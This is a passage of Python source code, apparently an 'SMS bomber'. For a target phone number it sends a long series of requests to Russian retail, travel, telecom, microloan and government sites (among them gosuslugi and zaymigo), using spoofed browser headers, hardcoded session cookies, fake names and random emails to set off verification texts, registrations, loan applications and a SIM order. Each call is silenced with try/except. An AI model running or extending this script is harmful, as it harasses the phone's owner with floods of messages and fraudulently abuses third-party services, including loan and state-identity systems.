                'cookie': '_cfuvid=niRXx8FEscDdwEZcbQBkuUsNaKKENY758SgtDB57zoA-1667585854597-0-604800000; favoriteProducts=%5B%5D; CITY_CONFIRM=true; without_critical=1; reuserid=d2314c12-cce6-46e1-8955-1173e60338f7; O_ZONE_ALIAS=msk; O_CITY_ID=133; SETCITY=133; dtCookie=v_4_srv_1_sn_689C90C537E1DB01B95EB82A7DEBB5E6_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; SITE_SESSID=og4i452ghf6iv1of9c8r00eqr0; branch=K; cf_clearance=e2a2205501dafb3bf87873b2124c0738bea5693a-1667590180-0-150; searchPlaceholder=%25D0%25A3%25D1%2586%25D0%25B5%25D0%25BD%25D0%25B5%25D0%25BD%25D0%25BD%25D1%258B%25D0%25B5%2520%25D1%2581%25D0%25BC%25D0%25B0%25D1%2580%25D1%2582%25D1%2584%25D0%25BE%25D0%25BD%25D1%258B; __cf_bm=aBYWEoj8cSOBrcje9oCzroNpBVWTD0qYy_avyt1ea2g-1667590182-0-AXB6r6+dn1ulF7849ULVkAdvlQwYGsG9o4/7Hke1yzaI5xD+kHzm18NsHRU8UJFr6pkbrkJ8T3F8ZEdq0ZzXRfOjH8NTmifBlC1B+icPKgWuyiBpmhdLKZPy669t6TZkTocJNii2TX87IZjN0ER0Tcu9YAtHYnErIk5enhaa9K7lOL6VPE4p+wtDuJkSx7rTOA==',
                'origin': 'https://www.svyaznoy.ru',
                'referer': 'https://www.svyaznoy.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest'
            }

            requests.post(f'https://www.svyaznoy.ru/api/v2/sms-verification-code/{number[1:]}', headers=header)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'cache-control-version': '527d4952171b0b0f1b75544d1b090b09091b0a02010e02010e021b7c766f',
                'content-length': '38',
                'content-type': 'application/json',
                'cookie': 'referrer_first=dir; referrer_hist=dir; referrer=; accept_language=ru; abst=test_a; vid=b13a31d4-2feb-49e0-8f7d-a33aface1476; rm=758e2f3b6d1c747c776f37d331f76b8d495a65cbf5c3d910a30406cf76ecdbfa7f187a8a9223f69f6d26e1b75398615fbbb5cda084fa43362bb7598246bea249; sid=g0v+9sLViCLWl3Koz3ws/AwH; ENVID=production-a|Y2VvQ',
                'origin': 'https://www.onetwotrip.com',
                'referer': 'https://www.onetwotrip.com/ru/p/account',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-ott-cookie': ''
            }

            payload = {
                "phone": "+"+number,
                "reseller": ""
            }

            requests.patch(
                'https://www.onetwotrip.com/_auth/profile/phone/with-confirm', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'Host': 'id.x5.ru',
                'Connection': 'keep-alive',
                'Content-Length': '62',
                'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                'Content-Type': 'text/plain;charset=UTF-8',
                'sec-ch-ua-mobile': '?0',
                'User-Agent': user,
                'sec-ch-ua-platform': '"Windows"',
                'Accept': '*/*',
                'Origin': 'https://id.x5.ru',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://id.x5.ru/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                'Cookie': 'ADRUM_X5ID_ID=c244c0e7-8aa6-48b7-9338-5afdddecfff7; client_id=scan-go; _ym_uid=166759288675677947; _ym_d=1667592886; _ym_isad=1; NSC_je_djq_l8t_31443_IUUQT_OB_WT=ffffffffc3a06eea45525d5f4f58455e445a4a424ce3; TS01f13338=01a93f754713688a8c7e681ee5acee46e42ed7540cc2faf718491f599a7aebf53cfc448b16c99bd8ef8a311e991b82971d9f63d60a52d59702582f1819df7def40295d823c; TS9f472ee0027=08549da071ab200080e88c8e8e79e0a43eec4808dc4dbf3994e4c7202a42afcb9ff6e8076bae3b9a083c8fa200113000306ff3aaede77deedd6aa63205e1b29bbdaf2a4c116f66a0c6d4cefe4d22b0b7ba3d19b0aaa7c1d572af87f3342ab1a8'
            }

            payload = {"query": "{ user_credentials(login:\""+number+"\") {login}}"}

            requests.post('https://id.x5.ru/graphql', json=payload, headers=header)

            header = {
                'Host': 'id.x5.ru',
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': user,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                'Cookie': f'AUTH_SESSION_ID=6946e902-5a34-4fff-8bb3-0abd0b9d916f.keycloak-1; AUTH_SESSION_ID_LEGACY=6946e902-5a34-4fff-8bb3-0abd0b9d916f.keycloak-1; TS011f02d7=01a93f754761231efd74e3f1bc015aef76f6b41547c2faf718491f599a7aebf53cfc448b16c99bd8ef8a311e991b82971d9f63d60a715a7a8bb3c6ad1dcd9b67582d8df48fd8f8552a5708f6d529090241346b5b9394f59e54e3e3ac9ba846810106dc79dd2a5948f9a0ae79f8ccd5359726c54685e1c92736c1249661e86bbbdca5deae36a5f9dbab518e52b0978ba1464a5e28d65132783f29cad08085178b3c1df53330; TS01a01a08=01a93f7547b2ffba6af8adcef0b38f12c0669903efc2faf718491f599a7aebf53cfc448b16c99bd8ef8a311e991b82971d9f63d60aa1b652b97a98d0b3af6d12de55d1f35e2319dbd39c047a742f2e8e74069de664f82800cb7876ba8fbd385e9c3b65d0df416ca669d31d0ce785cc787fc30f754ee2cc4629ca8079708cff99e1301a8528; ADRUM_X5ID_ID=c244c0e7-8aa6-48b7-9338-5afdddecfff7; client_id=scan-go; _ym_uid=166759288675677947; _ym_d=1667592886; _ym_isad=1; TS01f13338=01a93f754713688a8c7e681ee5acee46e42ed7540cc2faf718491f599a7aebf53cfc448b16c99bd8ef8a311e991b82971d9f63d60a52d59702582f1819df7def40295d823c; loginHint={number}; recaptcha_token=undefined; recaptcha_enable=false; recaptcha_hidden=false; recaptcha_pkey=6Lchf7MaAAAAAHbkxKLpB18bW27aP6JHw9Vi9ryd; ym_enable=true; ym_account_code=83748952; theme=scan-go; theme_idp=; action=register; UDI_1=rzfA5DILPx5i; UDI_2=b5MB94pzaA%3D%3D; TS9f472ee0027=08549da071ab20005a71cf8b4dbd7ccf36ba534867106999e5a7d74dfe5a333e46de8b528869c35c08611e2f66113000e9ceba28e645960145de1e7ee7439deaae9b3cc0da32656772de534296faf9268fa62aeaec39477b613092f92e71c65d'
            }

            requests.get(
                'https://id.x5.ru/auth/realms/ssox5id/protocol/openid-connect/registrations?client_id=scan-go&redirect_uri=https%3A%2F%2Fid.x5.ru%2Fsuccess&state=7d96c6bf-1450-4153-be7e-c70261f56f74&response_mode=fragment&response_type=code&scope=openid%20offline_access&nonce=e9397d57-9fdd-4f8b-a251-a6f27908f064&ui_locales=ru',
                headers=header)
        except:
            pass
        try:
            num2 = "+7({}{}{}){}{}{}{}".format(number[1], number[2], number[3], number[4], number[5], number[6], number[7]+number[8]+number[9]+number[10])

            lib = '1234567890qwertyuiopasdfghjklzxcvbnm'
            lib2 = [
                '@gmail.com',
                '@hotmail.com',
                '@yahoo.com',
                '@yandex.ru'
            ]
            email = ''
            for i in range(random.randint(8, 27)):
                email += random.choice(lib)
            email += random.choice(lib2)

            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Content-Length': '121',
                'Content-Type': 'application/json',
                'Cookie': 'c_Rm3zyGZZScjt=68ECA43FE3B1877E264408431DC87AE1; c_Rm3zyGZZScjt_2=5090; c_Rm3zyGZZScjt_3=1762777891; fhp=rBBoEGNld1ScuxwtwuvvAg==; cox_id=ffffffffaf18760145525d5f4f58455e445a4a423660; defaultLocale=fr; srv_id=ec27836394f5c7031fa5a6a9ada4f64f; JSESSIONID=4216888F567E32D22B661B6D8A59C09C; ESIA_SESSION=dba8a9d2-a71a-41aa-b047-0cd00ce1d70a; sso_segment=oauth; __gsac_gib-w-gosuslugi=9b51a7b2-11e9-9546-6562-08ee6cdd6df8; __gsac_gib-w-gosuslugi=9b51a7b2-11e9-9546-6562-08ee6cdd6df8; usi_portal=rBooj2Nld1dtAG3RCVpoAg==; __zzatgib-w-gosuslugi=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2VrTXdcdF53W3dWcDRqYVhDOmgdTRwaSk5fbxt7Il8qCCRjNV8ZQ2pODWk3XBQ8dWU+R3N6LkRpHWdQWSVKUT9IXl1JEjJiEkBATUcNN0BeN1dhMA8WEU1HFT1WUk9DKGsbcVgw03W1YQ==; __zzatgib-w-gosuslugi=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2VrTXdcdF53W3dWcDRqYVhDOmgdTRwaSk5fbxt7Il8qCCRjNV8ZQ2pODWk3XBQ8dWU+R3N6LkRpHWdQWSVKUT9IXl1JEjJiEkBATUcNN0BeN1dhMA8WEU1HFT1WUk9DKGsbcVgw03W1YQ==; REG_CTX=c0f3ae8f-883f-40cd-84d6-04838ce21224; cfidsgib-w-gosuslugi=Y54VkhUlWa+EP5BtRLCv5BRPo9uypSiW+89DbRh3mcCKnLN9OXCQivLOn0EiTJl+kZHvh/TwPiVtmaF6yHqBYoBZacnb82IXoVHkWZX+R/B4MMGlllLYfBqc07Zyt8L0XVNQUrp92kp04PtCzeM+H7528G5TnCaj01yk; cfidsgib-w-gosuslugi=Y54VkhUlWa+EP5BtRLCv5BRPo9uypSiW+89DbRh3mcCKnLN9OXCQivLOn0EiTJl+kZHvh/TwPiVtmaF6yHqBYoBZacnb82IXoVHkWZX+R/B4MMGlllLYfBqc07Zyt8L0XVNQUrp92kp04PtCzeM+H7528G5TnCaj01yk; gsscgib-w-gosuslugi=Vlfsn8/t/HaoK3RcW0w+BuMy/ZuRHl8QJDgLV8bCvcwnB58MujMO7U05tQuppkmzpYXNIcmYip4gT/WexTVYZRFvLHCytAcOvG2KXQUTbl8UHMFMTiQph3sssCfy7p807jrkRGSUJfM9968iad1MzZu6NqJXibexSRSkIIlWc44sdxOzMUAcqg4K57o9yfC8/ypN+UPLAeSRuNyM3tA40RNndhyznHQfQ++naVIrk1nTMKhvzeETF1RdjUi9KQ==; gsscgib-w-gosuslugi=Vlfsn8/t/HaoK3RcW0w+BuMy/ZuRHl8QJDgLV8bCvcwnB58MujMO7U05tQuppkmzpYXNIcmYip4gT/WexTVYZRFvLHCytAcOvG2KXQUTbl8UHMFMTiQph3sssCfy7p807jrkRGSUJfM9968iad1MzZu6NqJXibexSRSkIIlWc44sdxOzMUAcqg4K57o9yfC8/ypN+UPLAeSRuNyM3tA40RNndhyznHQfQ++naVIrk1nTMKhvzeETF1RdjUi9KQ==; fgsscgib-w-gosuslugi=hUuR4fa26748071a91d90cf6b64349853a1743e4; fgsscgib-w-gosuslugi=hUuR4fa26748071a91d90cf6b64349853a1743e4',
                'Host': 'esia.gosuslugi.ru',
                'Origin': 'https://esia.gosuslugi.ru',
                'Referer': 'https://esia.gosuslugi.ru/login/registration',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-GIB-FGSSCgib-w-gosuslugi': 'hUuR4fa26748071a91d90cf6b64349853a1743e4',
                'X-GIB-GSSCgib-w-gosuslugi': 'Vlfsn8/t/HaoK3RcW0w+BuMy/ZuRHl8QJDgLV8bCvcwnB58MujMO7U05tQuppkmzpYXNIcmYip4gT/WexTVYZRFvLHCytAcOvG2KXQUTbl8UHMFMTiQph3sssCfy7p807jrkRGSUJfM9968iad1MzZu6NqJXibexSRSkIIlWc44sdxOzMUAcqg4K57o9yfC8/ypN+UPLAeSRuNyM3tA40RNndhyznHQfQ++naVIrk1nTMKhvzeETF1RdjUi9KQ=='
            }

            payload = {
                'email': email,
                'first_name': 'Потанин',
                'last_name': 'Василий',
                'phone': num2
            }

            requests.post('https://esia.gosuslugi.ru/registration_api/user-data', json=payload, headers=header)
        except:
            pass
        try:
            lib = '1234567890qwertyuiopasdfghjklzxcvbnm'
            lib2 = [
                '@gmail.com',
                '@hotmail.com',
                '@yahoo.com',
                '@yandex.ru'
            ]
            email = ''
            for i in range(random.randint(8, 27)):
                email += random.choice(lib)
            email += random.choice(lib2)

            header = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '368',
                'content-type': 'application/json;charset=UTF-8',
                'cookie': '__ddg1_=7adIg7X1SQ3s1sqTbKQz; PHPSESSID=a840033f0d2b10e34442f83013bb3f0f; partner=zseo',
                'origin': 'https://borrow.zaymigo.com',
                'referer': 'https://borrow.zaymigo.com/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user
            }

            payload = {"jsonrpc":"2.0","id":"15930021-2bf0-4be4-acef-065304196abb","method":"create","params":{"borrower":{"surname":"Пупкин","name":"Василий","patronymic":"Андреевич","patronymicNotExists":False,"phone":"+"+number,"email":email,"phoneParams":[]},"term":12,"amount":10000,"agreements":[{"name":"assignment_of_claims","val":True}]}}

            requests.post('https://borrow.zaymigo.com/rpc/v1', json=payload, headers=header)
        except:
            pass
        try:
            num = number
            num2 = num[1] + num[2] + num[3]
            num3 = num[4] + num[5] + num[6]
            num4 = num[7] + num[8]
            num5 = num[9] + num[10]

            header = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Cookie': 'JSESSIONID=s1~E49FFD68DAD12AC94BD1879CDD6E58BA; YOTA_SITE_VISITED=true; INITIAL_REFERER=direct; COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=ru_RU; YOTA_REGION_CODE=O_75; NSC_xxx.zpub.sv-mcwt-iuuq-8079=ffffffff093b421945525d5f4f58455e445a4a4229bf; _ym_uid=1667594839288723167; _ym_d=1667594839; tmr_lvid=b4bc9fec2e063fa03e51fc100df9d272; tmr_lvidTS=1667594839035; _ym_visorc=b; _ym_isad=2; analytic_id=1667594840855704; REGION_APPROVED=true; _ga=GA1.2.165495858.1667594861; _gid=GA1.2.201805399.1667594861; LFR_SESSION_STATE_10161=1667594886294; tmr_detect=0%7C1667594888285; tmr_reqNum=19',
                'Host': 'www.yota.ru',
                'Referer': 'https://www.yota.ru/voice/order-sim',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest'
            }

            requests.get(f'https://www.yota.ru/voice/order-sim?p_p_id=yotagoodsorder_WAR_ecommerceportlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_cacheability=cacheLevelPage&p_p_col_id=column-1&p_p_col_count=2&_yotagoodsorder_WAR_ecommerceportlet_cmd=SaveOrderAndSendOtpCommand&_yotagoodsorder_WAR_ecommerceportlet_goodId=10&_yotagoodsorder_WAR_ecommerceportlet_timezone=1&_yotagoodsorder_WAR_ecommerceportlet_orderId=1658701&_yotagoodsorder_WAR_ecommerceportlet_fiasCode=a376e68d724a4472be7c891bdb09ae32&_yotagoodsorder_WAR_ecommerceportlet_phone=%2B7%20{num2}%20{num3}%20{num4}%20{num5}&_yotagoodsorder_WAR_ecommerceportlet_receivingWay=DELIVERY&_yotagoodsorder_WAR_ecommerceportlet_quantity=1&_yotagoodsorder_WAR_ecommerceportlet_isSet=true&_yotagoodsorder_WAR_ecommerceportlet_b2b=false&_yotagoodsorder_WAR_ecommerceportlet_createSource=site&_yotagoodsorder_WAR_ecommerceportlet_totalCoast=400&_yotagoodsorder_WAR_ecommerceportlet_sr=false&_yotagoodsorder_WAR_ecommerceportlet_mnp=true&_yotagoodsorder_WAR_ecommerceportlet_customerComment=&_yotagoodsorder_WAR_ecommerceportlet_paymentType=CASH&_yotagoodsorder_WAR_ecommerceportlet_deliverFrom=2022-11-06%2009%3A00&_yotagoodsorder_WAR_ecommerceportlet_deliverTo=2022-11-06%2012%3A00&_yotagoodsorder_WAR_ecommerceportlet_deliveryCost=0&_yotagoodsorder_WAR_ecommerceportlet_address=%D0%B3%20%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA%2C%20%D1%83%D0%BB%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%2C%20%D0%B4%202&_yotagoodsorder_WAR_ecommerceportlet_fullAddress=454087%2C%20%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%2C%20%D0%B3%20%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA%2C%20%D1%83%D0%BB%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%2C%20%D0%B4%202&_yotagoodsorder_WAR_ecommerceportlet_latitude=55.128053&_yotagoodsorder_WAR_ecommerceportlet_longitude=61.381264&_yotagoodsorder_WAR_ecommerceportlet_city=%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA&_yotagoodsorder_WAR_ecommerceportlet_street=%D1%83%D0%BB%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F&_yotagoodsorder_WAR_ecommerceportlet_house=2&_yotagoodsorder_WAR_ecommerceportlet_block=&_yotagoodsorder_WAR_ecommerceportlet_flat=&_yotagoodsorder_WAR_ecommerceportlet_fiasId=34bef4c8-de57-4d87-b8ed-912100b15903&_yotagoodsorder_WAR_ecommerceportlet_entrance=&_=1667594885833',
                headers=header)
        except:
            pass
        try:
            num2 = f"+7({number[1:4]}){number[4:7]}-{number[7:9]}-{number[9:]}"

            header = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '27',
                'content-type': 'application/json',
                'origin': 'https://foodzo.ru',
                'referer': 'https://foodzo.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'User-Agent': user
            }

            payload = {'dest': num2}

            requests.post('https://admin.foodzo.ru/api/v2/users/send-code/phone', json=payload, headers=header)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'bx-ajax': 'true',
                'content-length': '88',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'globusid=g3RvHv3DcXSnR0DwauXaFB3hSK2dGcke; REGION_178_170_198_53=%7B%22code%22%3Afalse%2C%22city_name%22%3Afalse%7D; BITRIX_SM_SALE_UID=7ca8b2b36b5cdc1f87f7b2ddd9858664; BITRIX_SM_GUEST_ID=11930120; rrpvid=747398470484838; BITRIX_CONVERSION_CONTEXT_s2=%7B%22ID%22%3A58%2C%22EXPIRE%22%3A1667681940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; BX_USER_ID=c35d2e5e5e9270c5b3d377e92deb5871; advcake_track_id=5a3e1860-39ce-d505-d051-3a9b18d2b777; advcake_session_id=6419119b-a2ba-a6b3-548d-a39767dcacb7; rcuid=63646f12e2746a93f2420567; _gcl_au=1.1.1464809485.1667680138; pagesCount=1; gtm-session-start=1667680137833; pages_cnt=2; _gid=GA1.2.1921378419.1667680138; _ga_WYXVN1FFMV=GS1.1.1667680138.1.0.1667680138.60.0.0; _gaclientid=1365190579.1667680138; _gasessionid=86b8c938-5ebe-4471-95b9-c6ca14762739; _gat_UA-6261130-10=1; _ga=GA1.2.1365190579.1667680138; tmr_lvid=bb82992cc80c00368f78b96a902a75be; tmr_lvidTS=1667680138078; _ym_uid=16676801381073701346; _ym_d=1667680138; st_uid=d98c6c41f362b09e98255ae50562dd90; _ym_isad=2; _ym_visorc=b; adrdel=1; adrcid=Akudtj5EGO_LUSRfXEyKF0Q; rai_new=dec530f7fa6d02dcb7b0c0215f212854; analytic_id=1667680139282854; tmr_detect=0%7C1667680140457; _gahitid=2022-11-05T21:29:10.498+01:00; tmr_reqNum=8',
                'origin': 'https://online.globus.ru',
                'referer': 'https://online.globus.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user
            }

            payload = {
                'AUTH_FORM': 'Y',
                'TYPE': 'AUTH',
                'FORM[AUTH_TYPE]': 'PHONE',
                'FORM[PHONE]': num2
            }

            requests.post('https://online.globus.ru/', data=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '224',
                'content-type': 'application/json',
                'cookie': '_ga=GA1.2.2108841258.1667680421; _gid=GA1.2.1628483400.1667680421; tmr_lvid=5c385c2b38e5657a71fb6f8ccf348cf0; tmr_lvidTS=1667680421368; _ym_uid=1667680422433564150; _ym_d=1667680422; _ym_isad=2; _ym_visorc=w; supportOnlineTalkID=ePvRx7CdRMpAMGC57X7IPaLHCSGEI8mL; __cfruid=354aabc5d3d3f1aed72964ff31d4d7043119adac-1667680508; ec_id=b22e8141-a6a2-49e9-addf-d0958d4b2bef; tmr_detect=0%7C1667680526135; deviceUid=ff004018-91ab-4913-9761-9c8c510136c2; tmr_reqNum=15',
                'origin': 'https://adengi.ru',
                'referer': 'https://adengi.ru/registration/personal',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-device-uid': 'b22e8141-a6a2-49e9-addf-d0958d4b2bef',
                'x-version-fe': '1666591147478'
            }

            payload = {
                "email": "e0grijoekg3_dwdw@hotmail.com",
                "firstName": "Василий",
                "hash": "a6ac90134b55d015bd2731fd4e2f06d3",
                "lastName": "Пупин",
                "middleName": "Иванович",
                "phone": number,
                "timestamp": 1667680555,
                "via": "sms"
            }

            requests.post('https://adengi.ru/rest/v1/registration/code/send', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '117',
                'content-type': 'application/json',
                'cookie': 'utid=uRELsmNka8x+akk1EoeDAg==; uteka_city_id=47; _ru_yandex_autofill=not_available',
                'origin': 'https://krym.uteka.ru',
                'platform': 'Desktop',
                'referer': 'https://krym.uteka.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'version': 'b835b033'
            }

            payload = {"jsonrpc": "2.0", "id": 6, "method": "auth.GetCode",
                       "params": {"phone": number[1:], "mustExist": False, "sendRealSms": True}}

            requests.post('https://krym.uteka.ru/rpc/?method=auth.GetCode', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Authorization': '',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Length': '82',
                'Content-Type': 'application/json',
                'Cookie': 'zdr_customer_external_id=44e62396-1cee-4165-80a3-8ce848633410; storage-shipment=%7B%22stockId%22%3A0%2C%22cityId%22%3A1%2C%22shipAddressId%22%3A0%2C%22shipAddressTitle%22%3A%22%22%2C%22stockTitle%22%3A%22%22%7D; deviceId=6adada4b-b83b-406a-ac5b-b6101d282cdc; is-converted-basket=true; is-converted-liked=true; qrator_jsid=1667778933.193.ee7fMuSZ0aiaAQ0h-9qis1t0fph2cphoe2s5j19q05nb2m296',
                'Host': 'zdorov.ru',
                'Origin': 'https://zdorov.ru',
                'Referer': 'https://zdorov.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user
            }

            payload = {
                'phone': number,
                'deviceId': '6adada4b-b83b-406a-ac5b-b6101d282cdc',
                'term': 2
            }

            requests.post('https://zdorov.ru/backend/api/customer/confirm', json=payload, headers=header)
        except:
            pass
        try:
            num2 = "+7 {} {} {} {} {}{}".format(num[1:4], num[4:7], num[7:9], num[9:11])

            header = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '54',
                'content-type': 'application/json;charset=UTF-8',
                'cookie': 'PHPSESSID=ukr2dhbg1r9ck65nvm93j7usgd; current_location_data=a%3A4%3A%7Bs%3A5%3A%22chain%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A19%3B%7Ds%3A4%3A%22name%22%3Bs%3A12%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%3Bs%3A9%3A%22full_name%22%3Bs%3A12%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%22%3Bs%3A11%3A%22location_id%22%3Bi%3A19%3B%7D; current_location_id=19; current_city=711; BITRIX_SM_ab_test_multi=%7B%22aa06%22%3A%7B%22ID%22%3A%227710124%22%2C%22NAME%22%3A%22aa06%22%2C%22GROUP%22%3A%22B%22%7D%2C%22aa07%22%3A%7B%22ID%22%3A%227710127%22%2C%22NAME%22%3A%22aa07%22%2C%22GROUP%22%3A%22B%22%7D%2C%22aa08%22%3A%7B%22ID%22%3A%227710128%22%2C%22NAME%22%3A%22aa08%22%2C%22GROUP%22%3A%22A%22%7D%2C%22aa09%22%3A%7B%22ID%22%3A%227710129%22%2C%22NAME%22%3A%22aa09%22%2C%22GROUP%22%3A%22B%22%7D%2C%22aa10%22%3A%7B%22ID%22%3A%227710131%22%2C%22NAME%22%3A%22aa10%22%2C%22GROUP%22%3A%22A%22%7D%2C%22dates%22%3A%7B%22ID%22%3A%227895663%22%2C%22NAME%22%3A%22dates%22%2C%22GROUP%22%3A%22%22%7D%2C%22kt_left%22%3A%7B%22ID%22%3A%228107330%22%2C%22NAME%22%3A%22kt_left%22%2C%22GROUP%22%3A%22A%22%7D%2C%22hity_prodazh%22%3A%7B%22ID%22%3A%228351207%22%2C%22NAME%22%3A%22hity_prodazh%22%2C%22GROUP%22%3A%22%22%7D%2C%22rr_popup%22%3A%7B%22ID%22%3A%228413423%22%2C%22NAME%22%3A%22rr_popup%22%2C%22GROUP%22%3A%22A%22%7D%2C%22aaaa%22%3A%7B%22ID%22%3A%228423545%22%2C%22NAM